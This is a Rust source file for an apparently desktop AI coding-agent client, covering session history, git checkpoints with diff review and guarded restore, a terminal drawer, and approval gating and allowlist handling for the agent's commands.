    /// affordance on a `run_command` row: re-run what the agent ran, by hand,
    /// where you can answer its prompts.
    SendToTerminal(String),
    ProviderChanged(String),
    ModelChanged(String),
    CatalogLoaded(Result<Vec<ProviderEntry>, String>),
    /// Past sessions, refetched rather than patched — the server owns titles and
    /// ordering, and a turn changes both.
    ThreadsLoaded(Result<Vec<CoderThreadSummary>, String>),
    OpenThread(i64),
    ThreadLoaded(Result<Box<agent_platform_client::types::CoderThreadOut>, String>),
    DeleteThread(i64),
    /// One second of a turn in flight.
    Tick,
    /// One frame of the spinner shown while a turn, a tool, or a sidebar fetch
    /// is in flight — see [`State::frame`].
    AnimTick,
    /// Run this session in its own checkout, or put it back in the project's.
    ToggleWorktree(bool),
    WorktreeReady(Result<PathBuf, String>),
    /// Apply the isolated session's work to the real checkout.
    MergeBack,
    MergedBack(Result<(), String>),
    New,
    /// A message for a session other than the one on screen — the board's
    /// routing envelope. Every task a session's own message produces is tagged
    /// with the session's id, so a background stream's frames land in the
    /// transcript they belong to rather than in whichever tab is in front.
    ///
    /// Handled entirely in [`crate::coder_board`]; a session never sees one.
    For(u64, Box<Message>),
    /// Bring a session to the front.
    SelectSession(u64),
    /// End a session and take it off the board. Its turn is stopped first, so
    /// the call the server is parked on gets answered rather than abandoned.
    CloseSession(u64),
    /// "Carry on in a new session": one tool-free turn writes the handoff, and
    /// its answer opens a fresh thread with that text already in the composer.
    Fork,
    LinkClicked(String),
    DismissError,

    // --- preview pane (see `crate::coder_browser`) ---------------------------
    ToggleBrowser,
    BrowserUrlChanged(String),
    /// Enter in the URL bar, or the reload button when the draft has moved on.
    BrowserGo,
    BrowserBack,
    BrowserForward,
    BrowserReload,
    /// The window moved or resized, or the screen changed — the child window
    /// has to be told where the strip is now.
    BrowserSync,
    /// The empty pane's one-click default, for the common dev-server port.
    BrowserOpenDefault,
    /// Take the preview off the screen without forgetting the page: leaving the
    /// Coder screen, or a modal going up over it.
    BrowserHide,
    /// A preview command came back. Only failures are kept — a working preview
    /// says so by being visible.
    BrowserDone(Result<(), String>),
}

/// Fetch the list of past sessions for the history sidebar.
pub fn load_threads(state: &mut State, client: &Client) -> Task<Message> {
    state.threads_loading = true;
    let client = client.clone();
    Task::perform(
        async move { client.coder_threads().await.map(|r| r.threads).map_err(|e| e.to_string()) },
        Message::ThreadsLoaded,
    )
}

/// Read the checkpoint timeline for the open folder.
///
/// Takes the whole state rather than a root because "no folder open" is the
/// common case at startup, and every caller would otherwise repeat the check.
pub fn load_checkpoints(state: &mut State) -> Task<Message> {
    let Some(root) = state.root.clone() else { return Task::none() };
    state.checkpoints_loading = true;
    Task::perform(async move { crate::coder_git::list(&root).await }, Message::CheckpointsLoaded)
}

/// Fetch the provider catalog for the header dropdowns.
pub fn load_catalog(client: &Client) -> Task<Message> {
    let client = client.clone();
    Task::perform(
        async move { client.llm_providers().await.map(|c| c.providers).map_err(|e| e.to_string()) },
        Message::CatalogLoaded,
    )
}

/// Which provider offers `model`, for putting the header back on a reopened
/// thread. Empty when the catalog has not loaded or does not list it — which
/// costs nothing, since an empty provider offers every model in the dropdown.
fn provider_of(catalog: &[ProviderEntry], model: &str) -> String {
    catalog
        .iter()
        .find(|p| p.models.options.iter().any(|m| m == model))
        .map(|p| p.id.clone())
        .unwrap_or_default()
}

/// Human-readable summary of a call, for the transcript row. `run_command`
/// shows the command itself — a row reading "run_command" is one the user
/// learns to approve without reading.
/// Rebuild a transcript from a thread's stored history.
///
/// The server keeps the OpenAI-shaped log — user turns, assistant turns that
/// may carry `tool_calls`, and `tool` messages answering them — so reopening a
/// session means turning that back into the rows the live stream produces. The
/// two have to agree: a reopened thread that renders differently from the one
/// you just had open is a thread you cannot trust to be the same thread.
///
/// Tool results are matched to calls in order, exactly as [`State::resolve_tool`]
/// does live, rather than by `tool_call_id` — the ids are the model's and a
/// model that reuses or mangles one would drop a row on the floor.
pub fn rebuild_turns(messages: &[serde_json::Value]) -> Vec<Turn> {
    let mut turns: Vec<Turn> = Vec::new();
    for m in messages {
        let role = m.get("role").and_then(|r| r.as_str()).unwrap_or_default();
        let content = m.get("content").and_then(|c| c.as_str()).unwrap_or_default();
        match role {
            "user" => turns.push(Turn::User(content.to_string())),
            "tool" => {
                let result = if content.starts_with("Error:") {
                    Err(content.to_string())
                } else {
                    Ok(content.to_string())
                };
                if let Some(Turn::Tool { result: slot, .. }) =
                    turns.iter_mut().find(|t| matches!(t, Turn::Tool { result: None, .. }))
                {
                    *slot = Some(result);
                }
            }
            "assistant" => {
                // The step that only called a tool has empty content; rendering
                // it would put a blank bubble above every tool row.
                if !content.trim().is_empty() {
                    turns.push(Turn::Assistant {
                        md: markdown::parse(content).collect(),
                        text: content.to_string(),
                    });
                }
                for call in m.get("tool_calls").and_then(|c| c.as_array()).into_iter().flatten() {
                    let f = call.get("function").unwrap_or(call);
                    let name = f.get("name").and_then(|n| n.as_str()).unwrap_or("tool");
                    turns.push(Turn::Tool { label: label_for(name, &call_args(f)), result: None });
                }
            }
            _ => {} // system prompts are not part of the conversation
        }
    }
    // A session that was interrupted mid-call is being *read*, not resumed —
    // leaving a row spinning forever would say otherwise.
    for t in &mut turns {
        if let Turn::Tool { result: result @ None, .. } = t {
            *result = Some(Err("never answered — the session ended here".into()));
        }
    }
    turns
}

/// A stored call's arguments. They ride as a JSON *string* in the OpenAI shape,
/// so they need parsing before anything can read a path or a checklist out.
fn call_args(f: &serde_json::Value) -> serde_json::Value {
    match f.get("arguments") {
        Some(serde_json::Value::String(s)) => {
            serde_json::from_str(s).unwrap_or(serde_json::Value::Null)
        }
        Some(v) => v.clone(),
        None => serde_json::Value::Null,
    }
}

/// The checklist a thread ended on, from the `update_todos` calls in its
/// history — the same rule as the transcript: the live panel and the reopened
/// one have to agree, and the arguments are already persisted, so nothing new
/// is stored to make that true.
pub fn rebuild_todos(messages: &[serde_json::Value]) -> Vec<Todo> {
    let mut todos = Vec::new();
    for m in messages {
        for call in m.get("tool_calls").and_then(|c| c.as_array()).into_iter().flatten() {
            let f = call.get("function").unwrap_or(call);
            if f.get("name").and_then(|n| n.as_str()) != Some("update_todos") {
                continue;
            }
            // A call the model mangled leaves the last good list up rather than
            // clearing the panel — same as live, where it answers with an error
            // and `todos` is untouched.
            let parsed = parse_todos(&call_args(f));
            if !parsed.is_empty() {
                todos = parsed;
            }
        }
    }
    todos
}

/// The checklist inside an `update_todos` call, bounded. Entries without text
/// are dropped rather than rendered as empty rows — a model that sends one is
/// telling us nothing, and a blank line in a pinned panel reads as a bug.
fn parse_todos(args: &serde_json::Value) -> Vec<Todo> {
    args.get("items")
        .and_then(|v| v.as_array())
        .into_iter()
        .flatten()
        .filter_map(|item| {
            let text = item.get("text").and_then(|t| t.as_str())?.trim();
            (!text.is_empty()).then(|| Todo {
                text: text.chars().take(MAX_TODO_CHARS).collect(),
                done: item.get("done").and_then(|d| d.as_bool()).unwrap_or(false),
            })
        })
        .take(MAX_TODOS)
        .collect()
}

/// The command a `run_command` call asks to run, or empty when none can be read
/// out of it. A model that leaks its tool syntax as prose gets its call salvaged
/// server-side with whatever arguments survived, which can be nothing.
fn command_of(args: &serde_json::Value) -> String {
    args.get("command").and_then(|c| c.as_str()).unwrap_or_default().trim().to_string()
}

/// The file a call is about to write, for follow mode.
///
/// `None` for anything that is not a write, and for a path that cannot be
/// resolved inside the root — the executor is about to refuse that call anyway,
/// and this must not be a second place that decides what is inside the workspace.
fn write_path(root: &std::path::Path, name: &str, args: &serde_json::Value) -> Option<PathBuf> {
    if !matches!(name, "write_file" | "edit_file") {
        return None;
    }
    let rel = args.get("path").and_then(|p| p.as_str())?;
    crate::coder_tools::resolve_in_root(root, rel).ok()
}

fn label_for(name: &str, args: &serde_json::Value) -> String {
    let arg = |k: &str| args.get(k).and_then(|v| v.as_str()).unwrap_or("");
    match name {
        // An empty command is a row that says nothing, which is how the last
        // one of these got missed. Same words the refusal card uses for it.
        "run_command" if arg("command").trim().is_empty() => "run_command (unreadable)".to_string(),
        "run_command" => format!("$ {}", arg("command")),
        "write_file" => format!("write_file {}", arg("path")),
        "edit_file" => format!("edit_file {}", arg("path")),
        "read_file" => format!("read_file {}", arg("path")),
        // The query, not the scope: `search "fn resolve_in_root"` is the row a
        // user can read past, `search src` is one they have to expand.
        "search" => format!("search {:?}", arg("query")),
        // It takes no arguments, so the default arm would render `repo_map({})`.
        "repo_map" => "repo_map".to_string(),
        // The list itself is the panel above the transcript; the row is only
        // there to say the agent moved.
        "update_todos" => {
            let items = parse_todos(args);
            format!("todos {}/{}", items.iter().filter(|t| t.done).count(), items.len())
        }
        "list_dir" => {
            let p = arg("path");
            format!("list_dir {}", if p.is_empty() { "." } else { p })
        }
        other => format!("{other}({args})"),
    }
}

pub fn update(state: &mut State, client: &Client, message: Message) -> Task<Message> {
    // A stopped turn's last frames are already in the runtime's queue when the
    // abort lands, and its tool task is still running. Everything they would do
    // now belongs to a turn that is over: a `Done` would blame the model for a
    // silent turn the user ended, and a late `ToolRan` would post a result the
    // server is no longer parked on.
    if state.stopped
        && matches!(
            message,
            Message::Event(_) | Message::ToolRan { .. } | Message::ToolPosted(_)
        )
    {
        return Task::none();
    }
    // Any frame off the resumed stream is the server acting on the decision, so
    // the call it answered is no longer pending. A `Failed` is the opposite —
    // the decision never landed, and its arm puts the card back.
    if state.resuming
        && matches!(message, Message::Event(ref e) if !matches!(e, CoderEvent::Failed(_)))
    {
        state.resuming = false;
        state.pending = None;
    }
    match message {
        Message::TraceLogs(_) => Task::none(),
        Message::PickRoot => Task::future(async {
            rfd::AsyncFileDialog::new()
                .set_title("Open a folder to code in")
                .pick_folder()
                .await
                .map(|h| h.path().display().to_string())
        })
        .map(Message::RootPicked),
        Message::RootPicked(None) => Task::none(),
        Message::RootPicked(Some(path)) => {
            // A new folder is a new session: the thread carries its workspace
            // root server-side, so reusing it would point the agent at the old
            // one while the screen showed the new. The settings around the
            // conversation are not part of the conversation and survive.
            *state = State {
                autonomy: state.autonomy,
                allowlist: std::mem::take(&mut state.allowlist),
                plan_mode: state.plan_mode,
                follow: state.follow,
                catalog: std::mem::take(&mut state.catalog),
                provider: std::mem::take(&mut state.provider),
                model: std::mem::take(&mut state.model),
                threads: std::mem::take(&mut state.threads),
                // The pane's visibility is a preference; what is *in* it
                // belongs to the folder that just went away.
                files_open: state.files_open,
                pane: state.pane,
                dock: state.dock,
                // The preview is aimed at a dev server, which the new folder
                // may well also be serving — and the child window is alive
                // either way, so forgetting the URL here would only strand it.
                browser_open: state.browser_open,
                browser_url: std::mem::take(&mut state.browser_url),
                browser_draft: std::mem::take(&mut state.browser_draft),
                ..State::with_root(&path)
            };
            state.refresh_tree();
            // The new folder may have been coded in before — its checkpoints
            // are in the folder, not in this app's state.
            load_checkpoints(state)
        }
        Message::DraftChanged(v) => {
            state.draft = v;
            Task::none()
        }
        Message::SetAutonomy(mode) => {
            state.autonomy = mode;
            Task::none()
        }
        // Approving is the same message; what this adds is the rule that will
        // answer the next one. The tier moves to `Allowlist` with it — a saved
        // rule nothing consults is a button that does nothing.
        Message::AlwaysAllow => {
            let Some(pending) = state.pending.clone() else { return Task::none() };
            let rule = rule_for(&pending.command);
            if rule.is_empty() {
                return Task::none();
            }
            state.allow_rule(rule);
            if state.autonomy == Autonomy::Ask {
                state.autonomy = Autonomy::Allowlist;
            }
            state.auto_approved = Some(pending.call_id.clone());
            resume_after_decision(state, client, &pending.call_id, true)
        }
        Message::SetPlanMode(mode) => {
            state.plan_mode = mode;
            // A card belongs to the mode that put it there. Leaving it up after
            // switching away is a gate on a screen that no longer gates.
            if mode != PlanMode::Gate {
                state.plan_card = None;
            }
            Task::none()
        }
        Message::PlanEdited(action) => {
            if let Some(card) = state.plan_card.as_mut() {
                card.perform(action);
            }
            Task::none()
        }
        Message::PlanRun => {
            let Some(card) = state.plan_card.take() else { return Task::none() };
            let plan = card.text().trim().to_string();
            if plan.is_empty() {
                return Task::none();
            }
            // Windsurf's trick, and `.agent/` is already ours: the plan is also
            // a file, so it can be read, edited or committed without this app.
            if let Some(root) = state.root.as_deref() {
                write_plan_file(root, &plan);
            }
            // Sent as the instruction rather than as a nudge back at the plan
            // already in the thread: the model has to carry out the *edited*
            // one, and a user row holding the plan is what a reopened session
            // rebuilds — the same rows, live or read back.
            start_turn(state, client, format!("Carry out this plan:

{plan}"), TurnKind::Work)
        }
        Message::PlanDiscard => {
            state.plan_card = None;
            Task::none()
        }
        Message::ToggleFollow(on) => {
            state.follow = on;
            if !on {
                state.following = None;
            }
            Task::none()
        }

        // --- checkpoints ---------------------------------------------------
        // None of these can fail a turn. git may not be installed, and the
        // agent's work is the point — the history of it is a convenience, so it
        // reports itself in the timeline and nowhere else.
        Message::Baselined(r) => {
            state.checkpoint_error = r.err();
            Task::none()
        }
        // A turn that changed nothing on disk gets no row.
        Message::Committed(Ok(false)) => state.drain_queued(),
        Message::Committed(Ok(true)) => {
            state.awaiting_turn_sha = true;
            Task::batch([load_checkpoints(state), state.drain_queued()])
        }
        // The queue still advances: git being absent or broken is not a reason to
        // drop follow-ups the user typed, it is a reason the timeline says so.
        Message::Committed(Err(e)) => {
            state.checkpoint_error = Some(e);
            state.drain_queued()
        }
        Message::CheckpointsLoaded(Ok(list)) => {
            // The turn that just committed is the newest row, and this is the
            // only place its sha is known — `Committed` reports whether there was
            // one, not which.
            if state.awaiting_turn_sha {
                state.awaiting_turn_sha = false;
                state.last_turn = list.first().map(|c| c.sha.clone());
            }
            state.checkpoints = list;
            state.checkpoint_error = None;
            state.checkpoints_loading = false;
            Task::none()
        }
        Message::CheckpointsLoaded(Err(e)) => {
            state.checkpoint_error = Some(e);
            state.checkpoints_loading = false;
            Task::none()
        }
        Message::ReviewCheckpoint(sha) => {
            // Opened empty and filled when the diff arrives — a panel that
            // appears blank for a second reads as a checkpoint with no changes.
            state.reviewing = Some((sha.clone(), None));
            state.changes = None;
            state.restore_armed = None;
            state.dock = Dock::Diff;
            // Looking at it is what the prompt was for.
            if state.last_turn.as_deref() == Some(sha.as_str()) {
                state.last_turn = None;
            }
            let Some(root) = state.root.clone() else { return Task::none() };
            let (patch_root, patch_sha) = (root.clone(), sha.clone());
            Task::batch([
                Task::perform(
                    async move { crate::coder_git::diff(&patch_root, &patch_sha).await },
                    Message::DiffLoaded,
                ),
                Task::perform(
                    async move { crate::coder_git::changes(&root, &sha).await },
                    Message::ChangesLoaded,
                ),
            ])
        }
        Message::DiffLoaded(Ok(text)) => {
            state.error = None;
            if let Some((_, slot)) = state.reviewing.as_mut() {
                *slot = Some(text);
            }
            Task::none()
        }
        // Amp's Oracle in its minimum viable form: no new protocol, no second
        // thread — a fresh tool-free turn in this one, over the patch. The
        // header's model picker is the "review it with something stronger" half,
        // and it already exists.
        Message::ReviewTurn(sha) => {
            // A turn is running, or one is parked on a decision. This one is not
            // a follow-up that can wait in the queue — it is about a diff that
            // the turn in flight may still be changing.
            let (Some(root), false) = (state.root.clone(), state.would_queue()) else {
                return Task::none();
            };
            Task::perform(
                async move { crate::coder_git::diff(&root, &sha).await },
                Message::ReviewDiffLoaded,
            )
        }
        Message::ReviewDiffLoaded(Err(e)) => {
            state.error = Some(format!("Could not read that checkpoint: {e}"));
            Task::none()
        }
        Message::ReviewDiffLoaded(Ok(patch)) => {
            // A turn's diff is unbounded and the context window is not. Cut from
            // the end and say so: the head of a patch is the stat block and the
            // first files, which is the part worth reading if only some of it
            // fits.
            let mut patch: String = patch.chars().take(MAX_REVIEW_CHARS).collect();
            if patch.chars().count() == MAX_REVIEW_CHARS {
                patch.push_str("

… the rest of this diff was too long to include.");
            }
            start_turn(
                state,
                client,
                format!("{REVIEW_ASK}

```diff
{patch}
```"),
                TurnKind::Review,
            )
        }
        Message::DiffLoaded(Err(e)) => {
            state.reviewing = None;
            state.error = Some(format!("Could not read that checkpoint: {e}"));
            Task::none()
        }
        Message::ChangesLoaded(Ok(changes)) => {
            state.changes = Some(changes);
            Task::none()
        }
        // The patch is the panel; the file list is the affordance on top of it.
        // Losing the list is not worth taking the diff off the screen for.
        Message::ChangesLoaded(Err(_)) => Task::none(),
        Message::RevertFile(path) => {
            let (Some(root), Some((sha, _))) = (state.root.clone(), state.reviewing.clone()) else {
                return Task::none();
            };
            Task::perform(
                async move {
                    // The way back, before the thing that needs one: reverting
                    // overwrites the file as it is *now*, which may include edits
                    // the user made since this checkpoint. A checkpoint in front
                    // of it is what makes one click safe enough to offer.
                    let _ =
                        crate::coder_git::commit_all(&root, &format!("before reverting {path}"))
                            .await;
                    crate::coder_git::revert_file(&root, &sha, &path).await
                },
                Message::FileReverted,
            )
        }
        Message::FileReverted(Ok(())) => {
            state.error = None;
            state.refresh_tree();
            // The file on screen may be the one that just changed under it.
            if let Some((path, _)) = state.viewing.as_ref().map(|(p, t)| (p.clone(), t)) {
                state.viewing = Some((path.clone(), crate::coder_files::read_capped(&path)));
            }
            // The pre-revert commit above is a new row, and the revert itself is
            // a change the *next* turn will commit.
            load_checkpoints(state)
        }
        Message::FileReverted(Err(e)) => {
            state.error = Some(format!("Could not revert that file: {e}"));
            Task::none()
        }
        // Also the dismiss on the "this turn changed files" bar: both mean the
        // same thing — done looking at what the turn did.
        Message::CloseReview => {
            state.reviewing = None;
            state.changes = None;
            state.last_turn = None;
            state.restore_armed = None;
            Task::none()
        }
        Message::RestoreCheckpoint(sha) => {
            // First press arms, second acts. Restoring is `git reset --hard`:
            // it takes the files back, and everything since — the agent's later
            // turns *and* whatever the user typed in their own editor — goes
            // with them. One click cannot be enough for that.
            if state.restore_armed.as_deref() != Some(sha.as_str()) {
                state.restore_armed = Some(sha);
                return Task::none();
            }
            state.restore_armed = None;
            let Some(root) = state.root.clone() else { return Task::none() };
            Task::perform(
                async move { crate::coder_git::restore(&root, &sha).await },
                Message::Restored,
            )
        }
        // The later checkpoints are gone from the branch now, so the timeline is
        // refetched rather than trimmed locally.
        Message::Restored(Ok(())) => {
            state.error = None;
            state.reviewing = None;
            state.changes = None;
            state.last_turn = None;
            load_checkpoints(state)
        }
        Message::Restored(Err(e)) => {
            state.error = Some(format!("Could not restore that checkpoint: {e}"));
            Task::none()
        }

        // --- files -----------------------------------------------------------
        Message::ToggleFiles => {
            // Re-walked on open rather than kept warm: a turn writes files, and
            // the pane is only ever wrong for as long as it is hidden.
            state.select_pane(if state.files_open { Pane::Sessions } else { Pane::Files });
            Task::none()
        }
        Message::SelectPane(pane) => {
            state.select_pane(pane);
            Task::none()
        }
        Message::SelectDock(dock) => {
            state.dock = dock;
            Task::none()
        }
        Message::RefreshTree => {
            state.refresh_tree();
            Task::none()
        }
        Message::ToggleDir(path) => {
            if !state.expanded.remove(&path) {
                state.expanded.insert(path);
            }
            state.refresh_tree();
            Task::none()
        }
        Message::OpenFile(path) => {
            let text = crate::coder_files::read_capped(&path);
            state.viewing = Some((path, text));
            state.dock = Dock::File;
            Task::none()
        }
        Message::CloseFile => {
            state.viewing = None;
            Task::none()
        }
        // --- terminal --------------------------------------------------------
        Message::ToggleTerminal => {
            // Closing drops the `Session`, which ends the shell and its PTY.
            // Deliberate: a hidden shell holding a dev server, with no window
            // to see it in, is a process the user cannot reason about.
            if state.term.take().is_some() {
                return Task::none();
            }
            state.dock = Dock::Terminal;
            state.open_terminal()
        }
        Message::Term(iced_term::Event::BackendCall(_, cmd)) => {
            let Some(session) = state.term.as_mut() else { return Task::none() };
            // `Shutdown` is the shell exiting — `exit`, or Ctrl-D. The drawer
            // goes with it rather than showing a dead grid.
            if session.0.handle(iced_term::Command::ProxyToBackend(cmd))
                == iced_term::actions::Action::Shutdown
            {
                state.term = None;
                // Whatever it did to the folder happened while it was open.
                state.refresh_tree();
            }
            Task::none()
        }
        Message::SendToTerminal(command) => {
            let open = if state.term.is_some() { Task::none() } else { state.open_terminal() };
            let Some(session) = state.term.as_mut() else { return open };
            crate::coder_term::send_line(session, &command);
            open
        }
        Message::ProviderChanged(v) => {
            // The picked model belongs to the old provider; keep it only if the
            // new one also offers it.
            state.provider = v;
            if !state.model_options().contains(&state.model) {
                state.model.clear();
            }
            Task::none()
        }
        Message::ModelChanged(v) => {
            state.model = v;
            Task::none()
        }
        // Only configured providers can answer, so only those are offered; the
        // rest stay in Settings → Providers until they have a key or endpoint.
        Message::CatalogLoaded(Ok(providers)) => {
            state.catalog = providers.into_iter().filter(|p| p.configured).collect();
            Task::none()
        }
        // The dropdowns stay empty and the turn runs on server defaults.
        Message::CatalogLoaded(Err(_)) => Task::none(),

        Message::ThreadsLoaded(Ok(threads)) => {
            state.threads = threads;
            state.threads_loading = false;
            Task::none()
        }
        // The sidebar just stays as it was; the live session is unaffected.
        Message::ThreadsLoaded(Err(_)) => {
            state.threads_loading = false;
            Task::none()
        }
        Message::OpenThread(id) => {
            if state.sending {
                return Task::none();
            }
            let c = client.clone();
            Task::perform(
                async move {
                    c.coder_thread(id).await.map(Box::new).map_err(|e| e.to_string())
                },
                Message::ThreadLoaded,
            )
        }
        Message::ThreadLoaded(Ok(thread)) => {
            // The root travels with the thread. Reopening a session against
            // whatever folder happened to be on screen would point the agent at
            // one project while the transcript describes another.
            if let Some(root) = thread.workspace_root.as_deref().filter(|r| !r.trim().is_empty()) {
                state.root = Some(PathBuf::from(root));
            }
            // So does the model. The server pins it on the thread and falls back
            // to it, so leaving the header on the last session's pick would send
            // that instead — a reopened session answering on a different model
            // than the one that wrote the rest of it.
            if let Some(model) = thread.model.as_deref().filter(|m| !m.trim().is_empty()) {
                state.provider = provider_of(&state.catalog, model);
                state.model = model.to_string();
            }
            state.thread_id = Some(thread.thread_id);
            state.turns = rebuild_turns(&thread.messages);
            state.todos = rebuild_todos(&thread.messages);
            state.open_tools.clear();
            state.pending = None;
            // A card belongs to the session that was on screen when its plan was
            // written; the plan itself is a row in whichever thread holds it.
            state.plan_card = None;
            state.kind = TurnKind::Work;
            // Follow-ups were queued against the session being left behind.
            state.queue.clear();
            state.drain_queued = false;
            state.error = None;
            state.reviewing = None;
            state.changes = None;
            state.last_turn = None;
            state.restore_armed = None;
            state.delete_armed = None;
            // The session may have come from another folder, and both the
            // timeline and the tree belong to the folder.
            state.expanded.clear();
            state.viewing = None;
            state.refresh_tree();
            Task::batch([
                iced::widget::operation::snap_to_end(transcript_id()),
                load_checkpoints(state),
            ])
        }
        Message::ThreadLoaded(Err(e)) => {
            state.error = Some(format!("Could not open that session: {e}"));
            Task::none()
        }
        Message::DeleteThread(id) => {
            if state.delete_armed != Some(id) {
                state.delete_armed = Some(id);
                return Task::none();
            }
            state.delete_armed = None;
            state.threads.retain(|t| t.id != id);
            // Deleting the open session leaves the transcript on screen but
            // detaches it: the next send opens a new thread rather than writing
            // into one the server no longer has.
            if state.thread_id == Some(id) {
                state.thread_id = None;
            }
            let c = client.clone();
            Task::perform(
                async move { c.delete_coder_thread(id).await.map_err(|e| e.to_string()) },
                |_| Message::Tick,
            )
        }
        // A turn parked on the approval gate is still a turn the user is
        // waiting through, and it is the *longest* wait available here — the
        // clock stopping on it is the one case hearth's counter exists for.
        Message::Tick => {
            if state.sending || state.would_queue() {
                state.elapsed += 1;
            }
            poll_terminal_run(state)
        }
        Message::AnimTick => {
            state.frame = state.frame.wrapping_add(1);
            Task::none()
        }
        Message::Send => {
            let prompt = state.draft.trim().to_string();
            if prompt.is_empty() || state.root.is_none() {
                return Task::none();
            }
            // A turn is already running, or parked on a decision. Enter means
            // "after this one", not "instead of it" — one turn at a time is the
            // thread's own constraint, not a UI choice.
            if state.would_queue() {
                state.queue.push(prompt);
                state.draft.clear();
                return Task::none();
            }
            state.draft.clear();
            // In gate mode this send is the *plan*, not the work: tool-free, so
            // the model cannot start editing before anyone has read it.
            // [`Message::PlanRun`] is the other caller, and it is never a plan
            // turn — it is the one the plan was for.
            let kind = match state.plan_mode {
                PlanMode::Gate => TurnKind::Plan,
                PlanMode::Off | PlanMode::Inline => TurnKind::Work,
            };
            start_turn(state, client, prompt, kind)
        }
        // Stopping is three things, and the order of the first two is the whole
        // point: **answer the parked call, then drop the stream.** The server is
        // blocked on a future keyed `(thread_id, call_id)`, so a stream dropped
        // while it holds one does not end the turn — it stalls it for the full
        // 300s delegation timeout, and the thread refuses the next send until
        // then. Answering first unblocks it; the loop's next emit then fails
        // against a client that is gone, which is how a turn ends server-side.
        Message::Stop => {
            // Nothing in flight, nothing to stop — which also makes a second
            // press a no-op rather than a second checkpoint.
            if !state.sending {
                return Task::none();
            }
            state.stopped = true;
            // Stop watching the drawer. The command itself is left alone — it is
            // running in the user's own shell, where they can watch it finish or
            // Ctrl-C it themselves, and killing a shell to end a turn is a
            // bigger thing than the button says.
            state.term_run = None;
            // A stopped plan turn is a plan that was never written, so there is
            // nothing for the card to ask about.
            state.kind = TurnKind::Work;
            // The user ended this turn, so the follow-ups behind it do not start
            // on their own — they stay as chips until they are sent or emptied.
            // [`Message::StopAndSend`] turns this back on for its own correction.
            state.drain_queued = false;
            let unblock = match (state.outstanding.take(), state.thread_id) {
                (Some(call_id), Some(thread)) => {
                    let c = client.clone();
                    Task::perform(
                        async move {
                            c.coder_tool_result(thread, &call_id, "Error: stopped by the user.")
                                .await
                                .map_err(|e| e.to_string())
                        },
                        // Nothing to report: the turn is already over as far as
                        // this screen is concerned, and a failed unblock only
                        // means the server times the call out on its own.
                        |_| Message::Tick,
                    )
                }
                _ => Task::none(),
            };
            if let Some(handle) = state.abort.take() {
                handle.abort();
            }
            state.sending = false;
            state.resuming = false;
            // A card whose turn has been killed is a button that would answer a
            // call nothing is waiting for.
            state.pending = None;
            state.close_open_tools("stopped by you");
            // The agent may well have written files before the stop, so the
            // turn is checkpointed exactly as a finished one is — a stop with no
            // undo behind it is the worst of both.
            let checkpoint = match state.root.clone() {
                Some(root) => {
                    let message = state.in_flight.clone();
                    Task::perform(
                        async move { crate::coder_git::commit_all(&root, &message).await },
                        Message::Committed,
                    )
                }
                None => Task::none(),
            };
            state.refresh_tree();
            Task::batch([unblock, checkpoint])
        }
        // The steer. Stop leaves the queue alone by design, so the correction
        // goes to the *front* of it and the stop's own checkpoint starts it —
        // which is what keeps this from racing the commit of the turn it killed.
        Message::StopAndSend => {
            let prompt = state.draft.trim().to_string();
            if prompt.is_empty() || !state.sending {
                return Task::none();
            }
            state.queue.insert(0, prompt);
            state.draft.clear();
            let stop = update(state, client, Message::Stop);
            state.drain_queued = true;
            stop
        }
        Message::Unqueue(idx) => {
            if idx >= state.queue.len() {
                return Task::none();
            }
            let text = state.queue.remove(idx);
            // Appended rather than replacing: the composer may already hold
            // something, and this must not be the click that loses it.
            if state.draft.trim().is_empty() {
                state.draft = text;
            } else {
                state.draft = format!("{}\n{text}", state.draft.trim_end());
            }
            Task::none()
        }
        Message::ThreadOpened(Ok(id)) => {
            state.thread_id = Some(id);
            send_turn(state, client)
        }
        Message::ThreadOpened(Err(e)) => {
            state.sending = false;
            state.error = Some(e);
            Task::none()
        }

        // An empty one is normal — the step that only called a tool sends one —
        // so it is dropped rather than rendered as a blank bubble. `answered`
        // is what stops a whole turn of them from being silent.
        Message::Event(CoderEvent::Assistant(text)) => {
            if text.trim().is_empty() {
                return Task::none();
            }
            state.answered = true;
            state.push_assistant(text);
            iced::widget::operation::snap_to_end(transcript_id())
        }
        // The plan the turn opened with. Rendered as an ordinary assistant row
        // because that is what a reopened session rebuilds it as — the server
        // persists it as a plain assistant message, and the two views of one
        // session have to agree. It does *not* count as the turn's answer: a
        // model that plans and then dies silently is still a silent turn, and
        // that is the failure this screen has to name out loud.
        Message::Event(CoderEvent::Plan(text)) => {
            if text.trim().is_empty() {
                return Task::none();
            }
            state.push_assistant(text);
            iced::widget::operation::snap_to_end(transcript_id())
        }
        Message::Event(CoderEvent::ToolCall { call_id, name, arguments }) => {
            let mut label = label_for(&name, &arguments);
            // The resumed turn emits the real call for whatever a rule answered,
            // and this is the only place that row exists. Unmarked, an approval
            // gate that nobody saw looks exactly like one somebody read.
            if state.auto_approved.as_deref() == Some(call_id.as_str()) {
                state.auto_approved = None;
                label.push_str(" — allowed by rule");
            }
            state.turns.push(Turn::Tool { label, result: None });
            // From here the server is parked on this call, and it is [`Message::Stop`]
            // that has to know it — see its arm.
            state.outstanding = Some(call_id.clone());
            // The checklist is this screen's state, not the workspace's, so this
            // one never reaches the executor: the arguments *are* the result.
            // It is also the only advertised tool the server's own executor does
            // not know, which is why it is answered before the root check below
            // rather than after it.
            if name == "update_todos" {
                let result = state.set_todos(&arguments);
                return Task::batch([
                    iced::widget::operation::snap_to_end(transcript_id()),
                    Task::done(Message::ToolRan { call_id, result }),
                ]);
            }
            // The server is blocked from here until the result is posted, so
            // every branch below must produce one — including "no root", which
            // cannot happen from the UI but would hang the turn if it did.
            let Some(root) = state.root.clone() else {
                return Task::done(Message::ToolRan {
                    call_id,
                    result: "Error: no workspace folder is open on the desktop.".into(),
                });
            };
            // Follow mode opens the file once the write has happened, so the path
            // waits here: opening it now would show the version being replaced.
            state.following =
                state.follow.then(|| write_path(&root, &name, &arguments)).flatten();
            let allow = state.autonomy.allows_commands();
            // An approved command runs where the user can watch it and answer
            // it, rather than headless behind a spinner. Headless stays the
            // fallback and this returns `None` to take it: a drawer that will
            // not open must not cost the turn.
            if name == "run_command" && allow {
                let command = command_of(&arguments);
                if !command.is_empty() {
                    if let Some(task) = start_in_terminal(state, &call_id, &command) {
                        return task;
                    }
                }
            }
            Task::batch([
                iced::widget::operation::snap_to_end(transcript_id()),
                Task::perform(
                    async move {
                        let result =
                            crate::coder_tools::execute(&root, &name, &arguments, allow).await;
                        (call_id, result)
                    },
                    |(call_id, result)| Message::ToolRan { call_id, result },
                ),
            ])
        }
        Message::ToolRan { call_id, result } => {
            let Some(thread) = state.thread_id else { return Task::none() };
